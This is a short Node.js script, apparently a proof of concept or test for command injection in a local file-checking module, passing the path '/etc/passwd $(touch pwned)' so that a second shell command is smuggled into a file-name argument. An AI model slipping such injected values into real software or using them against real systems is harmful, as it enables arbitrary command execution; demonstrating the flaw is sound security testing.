const Opened = require('./src/index');
const paths = ['/etc/passwd $(touch pwned)'];

Opened.files(paths,
    function(error, hashTable) {
        if (error) throw error;
        paths.forEach(
            function(path) {
                console.log(path + ' open=' + hashTable[path]);
            }
        );
    }
);